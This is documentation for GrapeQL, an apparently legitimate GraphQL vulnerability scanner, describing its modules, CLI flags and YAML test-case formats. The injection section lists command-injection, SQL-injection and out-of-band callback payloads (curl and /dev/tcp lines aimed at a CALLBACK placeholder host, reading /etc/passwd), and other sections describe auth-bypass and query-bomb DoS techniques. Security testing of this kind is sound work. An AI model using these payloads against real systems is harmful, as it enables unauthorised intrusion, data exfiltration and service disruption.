# GrapeQL Module Documentation

**Version:** 3.4  
**Author:** Aleksa Zatezalo  
**Date:** February 2025

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [CLI (`cli.py`)](#cli)
3. [GraphQL Client (`client.py`)](#graphql-client)
4. [Base Tester (`tester.py`)](#base-tester)
5. [Fingerprinter (`fingerprint.py`)](#fingerprinter)
6. [Info Tester (`info_tester.py`)](#info-tester)
7. [Injection Tester (`injection_tester.py`)](#injection-tester)
8. [Auth Tester (`auth_tester.py`)](#auth-tester)
9. [DoS Tester (`dos_tester.py`)](#dos-tester)
10. [AI Agent (`ai_agent.py`)](#ai-agent)
11. [Reporter (`reporter.py`)](#reporter)
12. [Test Case Loader (`loader.py`)](#test-case-loader)
13. [Baseline Tracker (`baseline.py`)](#baseline-tracker)
14. [Logger (`logger.py`)](#logger)
15. [Utilities (`utils.py`)](#utilities)
16. [YAML Test Case Format](#yaml-test-case-format)

---

## Architecture Overview

GrapeQL follows a top-down, modular pipeline architecture. The CLI orchestrates everything: it parses arguments, initialises shared infrastructure (client, logger, loader, baseline tracker), then executes test modules sequentially in a fixed order. Each module inherits from `VulnerabilityTester` and produces `Finding` objects that flow into the `Reporter` for output.

```
CLI (orchestrator)
 │
 ├── GraphQLClient ──── shared HTTP + schema state
 ├── GrapeLogger ────── structured log sink
 ├── TestCaseLoader ─── YAML test case discovery
 ├── BaselineTracker ── response-time statistics
 │
 ├── Fingerprinter ───► findings ──┐
 ├── InfoTester ──────► findings ──┤
 ├── InjectionTester ─► findings ──┼──► Reporter ──► markdown / JSON
 ├── AuthTester ──────► findings ──┤
 ├── DosTester ───────► findings ──┘
 │
 └── AIAgent ──────────► AI summary ──► Reporter (appended)
```

**Execution order** is enforced regardless of `--modules` order:

1. `fingerprint` — identify the engine
2. `info` — check information disclosure
3. `injection` — test for SQLi, command injection, OOB
4. `auth` — test authentication and authorization
5. `dos` — test denial of service (reads baseline from modules 1–4)

This ordering ensures the `BaselineTracker` has enough response-time samples before the DoS module needs a threshold.

---

## CLI

**File:** `cli.py`  
**Version:** 3.4  
**Class:** `GrapeQL`  
**Entry point:** `run_cli()`

The CLI is the main orchestrator. It parses arguments, builds shared infrastructure, loads the schema, runs modules in order, optionally invokes the AI agent, and generates the report.

### Arguments

| Argument | Type | Description |
|---|---|---|
| `--api` | `str` (required) | URL of the GraphQL endpoint to test. |
| `--modules` | `str[]` | Which modules to run. Default: all except `dos`. Choices: `auth`, `dos`, `fingerprint`, `info`, `injection`. |
| `--proxy` | `str` | Proxy address in `host:port` format. |
| `--auth` | `str` | Authorization token value. |
| `--auth-type` | `str` | Token prefix (default: `Bearer`). |
| `--cookie` | `str` (repeatable) | Cookie in `name:value` format. |
| `--report` | `str` | Output file path for the report. |
| `--report-format` | `str` | `markdown` (default) or `json`. |
| `--username` | `str` | Username for injection testing (default: `admin`). |
| `--password` | `str` | Password for injection testing (default: `changeme`). |
| `--log-file` | `str` | Path to structured log file. Omit for stdout. |
| `--test-cases` | `str` | Root directory for YAML test cases (default: bundled). |
| `--include` | `str[]` | Only load these YAML files (basename). Extension optional. |
| `--schema-file` | `str` | Path to a JSON introspection schema file. |
| `--listener-ip` | `str` | IP for the local OOB callback listener. |
| `--listener-port` | `int` | Port for the local OOB callback listener. |
| `--ai-key` | `str` | Anthropic API key for AI-assisted analysis. |
| `--ai-message` | `str` | Free-form guidance for the AI agent. |

### Key Methods

**`parse_arguments()`** — Defines and parses all CLI arguments via `argparse`.

**`_configure_client(client, args)`** — Applies proxy, auth token, and cookies to a `GraphQLClient` instance.

**`_resolve_modules(args)`** — Returns an ordered list of modules to run. Respects the fixed execution order regardless of user-specified order.

**`_load_schema(client, args)`** — Loads schema from `--schema-file` if provided (with an informational introspection probe), otherwise runs live introspection. Fails if neither method yields a schema.

**`_run_module(module_name, client, args, logger, loader, baseline)`** — Instantiates a test module by name, copies the client state, applies module-specific configuration (credentials, OOB listener), runs the test, and collects findings.

**`main()`** — Top-level async flow: parse args → validate → build infrastructure → load schema → run modules → AI analysis → report.

### Usage Examples

```bash
# Basic scan (all modules except DoS)
grapeql --api https://example.com/graphql

# Specific modules with OOB listener
grapeql --api http://localhost:5013/graphql \
    --modules fingerprint injection \
    --listener-ip 172.17.0.1 --listener-port 4444

# Only run DVGA-specific test cases
grapeql --api http://localhost:5013/graphql \
    --modules injection --include dvga_oob

# Full scan with AI summary
grapeql --api https://example.com/graphql \
    --report report.md --ai-key sk-ant-api03-...

# Pre-captured schema + logging
grapeql --api https://example.com/graphql \
    --schema-file schema.json --log-file scan.log
```

---

## GraphQL Client

**File:** `client.py`  
**Version:** 3.1  
**Class:** `GraphQLClient`

The unified HTTP client shared by all modules. Handles request execution, proxy support, header/cookie management, schema storage, and structured logging of every request/response pair.

### State

| Attribute | Type | Description |
|---|---|---|
| `endpoint` | `str` | Target GraphQL URL. |
| `proxy_url` | `str` | HTTP proxy URL if configured. |
| `headers` | `dict` | Request headers (default: `Content-Type: application/json`). |
| `cookies` | `dict` | Request cookies. |
| `auth_token` | `str` | Raw auth token value. |
| `schema` | `dict` | Cached introspection schema (`__schema` contents). |
| `query_fields` | `dict` | Parsed query fields: `{name: {args: [...]}}`. |
| `mutation_fields` | `dict` | Parsed mutation fields: `{name: {args: [...]}}`. |
| `timeout` | `aiohttp.ClientTimeout` | Request timeout (default: 10s). |

### Key Methods

**`make_request(method, url, **kwargs)`** — Generic async HTTP request with logging. Returns `(response_dict, error_string)`.

**`graphql_query(query, variables, operation_name)`** — Sends a GraphQL query via POST with proper JSON body. Delegates to `make_request`.

**`introspection_query()`** — Runs a full introspection query, parses the schema into `query_fields` and `mutation_fields`. Returns `True` on success.

**`load_schema_from_dict(schema_data)`** — Loads schema from a dict (e.g. read from a JSON file). Returns `True` on success.

**`setup_endpoint(endpoint, proxy)`** — Convenience: sets endpoint, configures proxy, and runs introspection.

**`set_log_context(module, test)`** — Sets the module/test name that appears in log records for subsequent requests.

### Schema Parsing

The client extracts `queryType` and `mutationType` fields from the introspection response. Each field is stored as:

```python
{
    "field_name": {
        "args": [
            {"name": "id", "type": {"name": "ID", "kind": "SCALAR", "ofType": None}},
            {"name": "title", "type": {"name": "String", "kind": "SCALAR", "ofType": None}},
        ]
    }
}
```

This structure is consumed by the injection tester (to find String/ID args), the auth tester (to build minimal queries), and the DoS tester (to find circular references and object fields).

---

## Base Tester

**File:** `tester.py`  
**Version:** 3.0  
**Class:** `VulnerabilityTester`

Abstract base class for all test modules. Provides shared infrastructure and a consistent interface.

### Inherited State

| Attribute | Source | Description |
|---|---|---|
| `self.client` | Constructor | `GraphQLClient` instance (with optional logger). |
| `self.printer` | Constructor | `GrapePrinter` for console output. |
| `self.logger` | Constructor | `GrapeLogger` instance (may be `None`). |
| `self.loader` | Constructor | `TestCaseLoader` for YAML discovery (may be `None`). |
| `self.baseline` | Constructor | `BaselineTracker` for response-time stats (may be `None`). |
| `self.findings` | Constructor | `List[Finding]` — accumulated findings. |
| `self.test_cases` | Auto-loaded | `List[Dict]` from YAML for this module's `MODULE_NAME`. |

### Key Methods

**`setup_endpoint(endpoint, proxy, pre_configured_client)`** — If a pre-configured client is provided, copies its state (endpoint, headers, cookies, schema) to avoid repeating introspection.

**`add_finding(finding)`** — Appends a finding and prints it with severity-appropriate formatting.

**`set_credentials(username, password)`** — Stores credentials for modules that need them.

**`get_findings()`** — Returns the accumulated findings list.

**`_record_response_time(duration)`** — Records a response time in the baseline tracker.

**`run_test()`** — Abstract method. Subclasses must override this. Returns `List[Finding]`.

### Creating a New Module

```python
from .tester import VulnerabilityTester
from .utils import Finding

class MyTester(VulnerabilityTester):
    MODULE_NAME = "my_module"  # matches test_cases/my_module/ directory

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        # self.test_cases is auto-loaded from YAML

    async def run_test(self):
        for tc in self.test_cases:
            # ... run test logic ...
            self.add_finding(Finding(...))
        return self.findings
```

---

## Fingerprinter

**File:** `fingerprint.py`  
**Version:** 3.1  
**Class:** `Fingerprinter`  
**Inherits:** `VulnerabilityTester`  
**MODULE_NAME:** `fingerprint`

Identifies the GraphQL server engine by sending behavioural probe queries and matching responses against known engine signatures.

### How It Works

Engine definitions are loaded from `test_cases/fingerprint/*.yaml`. Each engine definition contains a list of probes — specific GraphQL queries paired with expected response patterns. The fingerprinter iterates through engines and runs probes until one matches.

### Probe Matching

Each probe supports these detection keys:

| Key | Type | Description |
|---|---|---|
| `query` | `str` | GraphQL query to send. |
| `expect_error` | `str` | Error message substring to match. |
| `expect_error_any` | `str[]` | Match if ANY error substring appears. |
| `expect_error_part` | `{part, value}` | Match a non-`message` error field. |
| `expect_data` | `dict` | Exact match on `data` fields. |
| `expect_has_data` | `bool` | Require `data` key in response. |
| `expect_no_data` | `bool` | Require `data` key to be absent. |

### Findings

When an engine is identified:

- If the engine definition includes a `cve` list → `LOW` severity finding with CVE references.
- Otherwise → `INFO` severity finding (informational only).

### YAML Format

```yaml
test_cases:
  - engine_id: graphene
    name: Graphene (Python)
    url: https://graphene-python.org
    tech: [Python]
    cve: [CVE-2024-XXXXX]
    probes:
      - query: "{ __typename @skip }"
        expect_error: "Directive 'skip' argument 'if'"
```

---

## Info Tester

**File:** `info_tester.py`  
**Version:** 3.0  
**Class:** `InfoTester`  
**Inherits:** `VulnerabilityTester`  
**MODULE_NAME:** `info`

Tests for information disclosure vulnerabilities: introspection exposure, field suggestions, GraphiQL/playground interfaces, debug mode, batch query support, and GET method acceptance.

### How It Works

Check definitions come from `test_cases/info/*.yaml`. Each check specifies a request method, a detection rule, and finding metadata. If no YAML is available, falls back to hardcoded checks for field suggestions and introspection.

### Request Methods

| `method` / `send_as` | Behaviour |
|---|---|
| `POST` (default) | Standard GraphQL POST with `query` body. |
| `GET` | Plain GET to endpoint (e.g. GraphiQL detection). |
| `CHECK_SCHEMA` | No request — checks if `client.schema` exists. |
| `url_param` | GET with `?query=...` URL parameter. |
| `form_data` | POST with `application/x-www-form-urlencoded` body. |
| `batch` | POST with JSON array of `{query: ...}` objects. |

### Detection Rules

| `detection.type` | Description |
|---|---|
| `error_contains` | Match substring in error messages. |
| `data_field_exists` | Check if a specific data field is present. |
| `response_contains_any` | Match any of several substrings in response text. |
| `batch_response` | Check if response is an array of expected length. |
| `schema_exists` | Pass if introspection schema is cached. |

### YAML Format

```yaml
test_cases:
  - name: field_suggestions
    title: Field Suggestions Enabled
    severity: LOW
    method: POST
    query: "{ __schema { directive } }"
    detection:
      type: error_contains
      value: "Did you mean"
      case_insensitive: true
    description: "Field suggestions leak schema info via error messages."
    impact: "Information Leakage"
    remediation: "Disable field suggestions in production."
```

---

## Injection Tester

**File:** `injection_tester.py`  
**Version:** 3.1  
**Class:** `InjectionTester`  
**Inherits:** `VulnerabilityTester`  
**MODULE_NAME:** `injection`

Tests for SQL injection, command injection, and out-of-band (OOB) vulnerabilities. Payloads and detection indicators are loaded from YAML test cases.

### How It Works

The module operates in three phases:

1. **SQL injection** — Injects SQLi payloads into every `String`/`ID` argument and checks response text for database error indicators.
2. **Command injection** — Same approach with OS command payloads (e.g. `; id`, `| cat /etc/passwd`) and system output indicators.
3. **OOB injection** — Starts a local TCP listener, injects callback payloads (curl, wget, SSRF URLs), and detects vulnerabilities by receiving inbound connections.

### Payload Categories

Test cases are loaded from `test_cases/injection/*.yaml` and categorised by the `oob: true` flag:

| Category | Detection Method | Flag |
|---|---|---|
| `_sqli_cases` | Response content matching against indicators | `oob` absent |
| `_cmd_cases` | Response content matching against indicators | `oob` absent |
| `_oob_cases` | TCP listener callback detection | `oob: true` |

### OOB Testing

OOB testing is enabled when `--listener-ip` and `--listener-port` are provided. The flow:

1. **Start listener** — Async TCP server on the configured address.
2. **Phase 1: Raw queries** — Test cases with a `query` key are sent verbatim (with CALLBACK placeholder substitution). Used for multi-arg mutations like `importPaste(host, port, path, scheme)`.
3. **Phase 2: Generic payloads** — Test cases with a `payload` key are injected into every String/ID argument across all queries and mutations.
4. **Wait** — 10-second final wait for slow callbacks.
5. **Collect** — Any TCP connection received = CRITICAL finding.

### Placeholder System

| Placeholder | Replaced With | Example |
|---|---|---|
| `CALLBACK` | `http://ip:port` | `curl CALLBACK/exfil` → `curl http://10.0.0.5:4444/exfil` |
| `CALLBACK_HOST` | Listener IP only | `nslookup $(whoami).CALLBACK_HOST` |
| `CALLBACK_PORT` | Listener port only | `/dev/tcp/CALLBACK_HOST/CALLBACK_PORT` |

**Important:** Replacements are applied in order `CALLBACK_HOST` → `CALLBACK_PORT` → `CALLBACK` to prevent the shorter `CALLBACK` from clobbering the longer placeholders.

### OOBListener & OOBConnection

**`OOBListener`** — Async TCP server that records inbound connections. Sends `HTTP/1.1 200 OK` to prevent client hangs. Reads up to 4KB from each connection.

**`OOBConnection`** — Dataclass recording: timestamp, remote IP/port, payload name, and first 500 bytes of received data.

### YAML Format (Standard)

```yaml
test_cases:
  - name: sqli_basic_or
    payload: "' OR 1=1 --"
    indicators:
      - "syntax error"
      - "mysql"
      - "PostgreSQL"
```

### YAML Format (OOB — Generic)

```yaml
test_cases:
  - name: oob_curl_http
    oob: true
    payload: "; curl CALLBACK/cmd-curl"
```

### YAML Format (OOB — Raw Query)

```yaml
test_cases:
  - name: dvga_importpaste_ssrf_http
    oob: true
    query: 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT, path: "/ssrf", scheme: "http") { result } }'
```

### Configuration

```python
# Called by CLI when --listener-ip and --listener-port are set
instance.set_listener("10.0.0.5", 4444)

# Called by CLI when --username and --password are set
instance.set_credentials("admin", "changeme")
```

---

## Auth Tester

**File:** `auth_tester.py`  
**Version:** 3.1  
**Class:** `AuthTester`  
**Inherits:** `VulnerabilityTester`  
**MODULE_NAME:** `auth`

Tests for authentication bypass, IDOR, and field-level authorization failures.

### How It Works

1. **Baseline phase** — If auth headers are provided (`--auth`), runs every query/mutation with valid credentials and stores the responses.
2. **Attack phase** — Dispatches test cases by strategy, comparing manipulated responses against the baseline.

### Strategies

| Strategy | Description | Requires Baseline |
|---|---|---|
| `header_bypass` | Replays baseline queries with manipulated/missing auth headers. Auth bypass confirmed if response matches baseline. | Yes |
| `idor` | Enumerates sequential IDs on fields with `id`, `userId`, `accountId` etc. arguments. Reports if multiple IDs return data. | No |
| `raw_query` | Sends a specific query without authentication. Reports if data is returned. | No |

### Baseline Comparison

The `_response_matches_baseline()` method compares unauthenticated responses to the authenticated baseline. Auth bypass is confirmed when:

- Both responses have a `data` key.
- The unauthenticated response has the same data keys as the baseline.
- The unauthenticated response has no errors that the baseline didn't have.

### Query Building

The auth tester builds minimal queries automatically from the schema:

- **`_build_minimal_query(name, field)`** — Builds `{ fieldName { scalar1 scalar2 ... } }`, skipping fields with required arguments.
- **`_build_selection_set(field)`** — Picks up to 5 scalar sub-fields from the return type, falls back to `{ __typename }`.
- **`_is_safe_to_probe(field)`** — Heuristic: a mutation is safe to baseline if it has no required args.

### YAML Format

```yaml
test_cases:
  # Header bypass strategy
  - name: no_auth_header
    strategy: header_bypass
    description: "Request with auth header removed entirely"
    headers: {}

  - name: empty_bearer
    strategy: header_bypass
    description: "Empty Bearer token"
    headers:
      Authorization: "Bearer "

  # IDOR strategy
  - name: idor_user_id
    strategy: idor
    id_range: [1, 20]

  # Raw query strategy
  - name: unauth_system_health
    strategy: raw_query
    query: "{ systemHealth }"
    description: "systemHealth accessible without auth"
    headers: {}
```

---

## DoS Tester

**File:** `dos_tester.py`  
**Version:** 3.1  
**Class:** `DosTester`  
**Inherits:** `VulnerabilityTester`  
**MODULE_NAME:** `dos`

Tests for denial of service vulnerabilities using schema-aware query generation. Uses baseline statistics from other modules to set a statistically meaningful detection threshold.

### How It Works

1. **Threshold** — Computed from the `BaselineTracker`: `max(5.0s, mean + 3σ)`. If no baseline exists, defaults to 5.0s.
2. **Query generation** — Each attack type has a generator function that builds payloads from the introspection schema (circular references, deeply nested types, scalar fields, etc.).
3. **Detection** — A response is flagged as vulnerable if: response time exceeds the threshold, or the response contains error keywords like `timeout`, `memory`, or `stack`.

### Attack Generators

| Generator | Description | Config Keys |
|---|---|---|
| `generate_circular_query` | Exploits circular type references (e.g. `User.posts.author.posts...`). | `depth` (default: 10), `duplicates` (default: 3) |
| `generate_field_duplication` | Repeats a single scalar field thousands of times. | `repeat_count` (default: 10000) |
| `generate_deeply_nested_query` | Nests object fields to extreme depth. | `depth` (default: 100) |
| `generate_fragment_bomb` | Creates self-referencing fragment cycles. | `fragment_count` (default: 50) |
| `generate_array_batching` | Sends a batch of identical queries as a JSON array. | `batch_size` (default: 1000) |

All generators are schema-aware — they inspect `self.types` to find real field names and circular references. If the schema lacks the necessary structure, the generator returns an empty string and the test is skipped.

### YAML Format

```yaml
test_cases:
  - name: circular_query
    title: Circular Query DoS
    generator: generate_circular_query
    severity: HIGH
    depth: 15
    duplicates: 5
    impact: "Server resource exhaustion via recursive resolution"
    remediation: "Implement query depth and cost analysis limits"

  - name: array_batching
    title: Array Batching DoS
    generator: generate_array_batching
    send_as: batch
    batch_size: 2000
    severity: HIGH
    impact: "Server resource exhaustion via batch processing"
    remediation: "Limit maximum batch size"
```

### Safety

The DoS tester includes a 5-second sleep between attack types to allow the target server to recover. A warning is printed before testing begins.

---

## AI Agent

**File:** `ai_agent.py`  
**Version:** 1.0  
**Class:** `AIAgent`

Post-scan analysis module. Sends collected findings to the Anthropic Messages API and returns a structured executive summary with prioritised next steps.

### How It Works

The AI agent is not a `VulnerabilityTester` subclass — it doesn't scan anything. It runs after all modules complete but before report generation. It serialises all findings to JSON, builds a prompt with a system message constraining the output structure, and calls the Claude API.

### API Details

| Setting | Value |
|---|---|
| Endpoint | `https://api.anthropic.com/v1/messages` |
| Model | `claude-sonnet-4-20250514` |
| Max tokens | 4096 |
| Timeout | 120 seconds |
| HTTP client | `httpx.AsyncClient` (async) |

### Output Structure

The system prompt constrains Claude to produce exactly four sections:

1. **Executive Summary** — 2–4 sentences characterising overall security posture.
2. **Risk Analysis** — Per-finding impact and chaining analysis for CRITICAL/HIGH findings.
3. **Recommended Next Steps** — Numbered list of manual testing actions.
4. **Gaps in Coverage** — Attack classes the automated scan may have missed.

### Usage

```python
agent = AIAgent(api_key="sk-ant-api03-...")
summary_md = await agent.analyse(
    target="http://localhost:5013/graphql",
    findings=reporter.findings,
    message="Focus on SSRF chains",
)
# summary_md is a Markdown string appended to the report
```

### Error Handling

The agent handles: HTTP errors (non-200 status), timeouts (120s), network errors, and malformed responses. On any failure, it prints an error and returns `None` — the report is generated without the AI section.

---

## Reporter

**File:** `reporter.py`  
**Version:** 2.2  
**Class:** `Reporter`

Generates reports from accumulated findings in Markdown or JSON format.

### Key Methods

**`set_target(target)`** — Sets the target URL for the report header.

**`add_findings(findings)`** / **`add_finding(finding)`** — Adds findings with deduplication (by title + endpoint).

**`set_ai_summary(summary)`** — Stores the AI analysis markdown for inclusion in reports.

**`generate_markdown(output_file)`** — Writes a Markdown report with sections: Executive Summary, Findings Summary (severity table), Detailed Findings, Remediation Summary, and AI Analysis (if available).

**`generate_json(output_file)`** — Writes a JSON report with target, timestamp, findings array, and `ai_analysis` key (if available).

**`print_summary()`** — Prints a coloured console summary with severity breakdown and critical/high finding highlights.

**`generate_report(output_format, output_file)`** — Dispatch method that calls the appropriate generator and then `print_summary()`.

### Report Structure (Markdown)

```markdown
# GrapeQL Security Assessment Report
## Target: ...
## Date: ...
## Executive Summary
## Findings Summary (table)
## Detailed Findings (per finding)
## Remediation Summary (grouped by remediation action)
---
## AI Analysis (if --ai-key was provided)
### Executive Summary
### Risk Analysis
### Recommended Next Steps
### Gaps in Coverage
```

---

## Test Case Loader

**File:** `loader.py`  
**Version:** 3.1  
**Class:** `TestCaseLoader`

Discovers and loads YAML test case files from a directory tree. Each module has its own subdirectory.

### Directory Layout

```
test_cases/
├── fingerprint/
│   └── engines.yaml
├── injection/
│   ├── sqli.yaml
│   ├── command.yaml
│   ├── oob.yaml
│   └── dvga_oob.yaml
├── info/
│   └── checks.yaml
├── auth/
│   └── bypass.yaml
└── dos/
    └── attacks.yaml
```

### Key Methods

**`load_module(module_name)`** — Loads and merges all `.yaml`/`.yml` files under `<root>/<module_name>/`. Respects the include filter if set.

**`load_file(relative_path)`** — Loads a single YAML file by relative path.

**`available_modules()`** — Returns subdirectory names that contain at least one YAML file.

**`set_include_files(filenames)`** — Restricts which YAML files are loaded. Accepts basenames with or without extension. Used by `--include` CLI flag.

### YAML Format

All YAML files must have a top-level `test_cases` key containing a list of dicts:

```yaml
test_cases:
  - name: test_name
    # ... test-case-specific keys
```

---

## Baseline Tracker

**File:** `baseline.py`  
**Version:** 3.0  
**Class:** `BaselineTracker`

Thread-safe collector of response-time samples across all modules. Provides the statistical baseline that the DoS tester uses to distinguish normal latency from anomalous slowdowns.

### How It Works

Every module calls `self._record_response_time(duration)` after each request. These samples accumulate in the tracker, keyed by module name. When the DoS tester runs, it reads the aggregate statistics (mean + standard deviation across all modules) to compute a threshold.

### Key Methods

**`record(module, duration)`** — Record a single response-time sample.

**`get_aggregate_stats()`** — Returns `(mean, stddev, count)` across all modules.

**`get_dos_threshold(min_threshold=5.0)`** — Computes `max(min_threshold, mean + σ_multiplier × stddev)`. Default σ multiplier is 3.0.

**`has_baseline()`** — Returns `True` if any samples have been recorded.

**`summary()`** — Returns a dict with per-module and aggregate statistics.

### Threshold Formula

```
threshold = max(5.0, mean + 3.0 × stddev)
```

With a typical web app averaging 0.3s ± 0.1s, the threshold would be `max(5.0, 0.3 + 0.3) = 5.0s`. For a slow API averaging 3.0s ± 1.0s, it would be `max(5.0, 3.0 + 3.0) = 6.0s`.

---

## Logger

**File:** `logger.py`  
**Version:** 3.0  
**Class:** `GrapeLogger`

Structured logging for all GrapeQL modules. Produces consistent, parseable log records.

### Log Format

```
TIMESTAMP | LEVEL   | MODULE               | TEST                           | PARAMETER            | VERB | STATUS   | DURATION | MESSAGE
```

Example:

```
2025-02-04 12:00:00 | INFO    | InjectionTester      | sqli_basic_or                  | createPaste.content  | POST | success  |  0.342s | payload=[' OR 1=1 --] response=[{"data":{"createPaste"...}]
```

### Key Methods

**`log_request(module, test, parameter, payload, verb, status, response, duration)`** — Emits one structured log record. Response is truncated to 200 characters.

**`log_timeout(module, test, ...)`** — Logs a timeout event at WARNING level.

**`log_error(module, test, message, ...)`** — Logs a generic error at ERROR level.

### Output

If `--log-file` is provided, logs to file. Otherwise logs to stdout. The logger creates a standard Python `logging.Logger` with a custom formatter.

---

## Utilities

**File:** `utils.py`  
**Version:** 3.1

### GrapePrinter

Coloured console output for GrapeQL. Provides consistent formatting for messages, sections, and vulnerability findings.

| Method | Description |
|---|---|
| `print_msg(message, status)` | Print with status indicator: `success` (green `[+]`), `warning` (yellow `[!]`), `error`/`failed` (red `[-]`), `log` (cyan `[!]`). |
| `print_section(title)` | Print a section header: `=== Title ===`. |
| `print_vulnerability(title, severity, details)` | Print a formatted vulnerability finding. |
| `intro()` | Print ASCII art logo, title, and example notifications. |

### Finding

Dataclass representing a security finding.

| Field | Type | Description |
|---|---|---|
| `title` | `str` | Finding title. |
| `severity` | `str` | `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, or `INFO`. Auto-uppercased. |
| `description` | `str` | Detailed description. |
| `endpoint` | `str` | Target endpoint URL. |
| `impact` | `str` (optional) | Impact description. |
| `remediation` | `str` (optional) | Remediation guidance. |
| `timestamp` | `str` | Auto-generated timestamp. |

**`to_dict()`** — Serialises to a dictionary (used by Reporter and AI Agent).

---

## YAML Test Case Format

All YAML files share a common structure with module-specific keys.

### Universal Keys

```yaml
test_cases:
  - name: unique_test_name        # Required: unique identifier
    title: Human Readable Title    # Optional: used in findings
    description: ...               # Optional: finding description
    severity: HIGH                 # Optional: CRITICAL/HIGH/MEDIUM/LOW/INFO
    impact: ...                    # Optional: impact statement
    remediation: ...               # Optional: remediation guidance
```

### Module-Specific Keys

| Module | Key | Description |
|---|---|---|
| Fingerprint | `engine_id`, `probes`, `cve`, `tech` | Engine identification |
| Info | `method`, `send_as`, `query`, `detection` | Information disclosure checks |
| Injection | `payload`, `indicators` | Standard injection |
| Injection (OOB) | `oob: true`, `payload` or `query` | Out-of-band injection |
| Injection (OOB) | `target_args` | Restrict injection to specific arg names |
| Auth | `strategy`, `headers`, `query`, `id_range` | Auth bypass testing |
| DoS | `generator`, `send_as`, config params | DoS attack generation |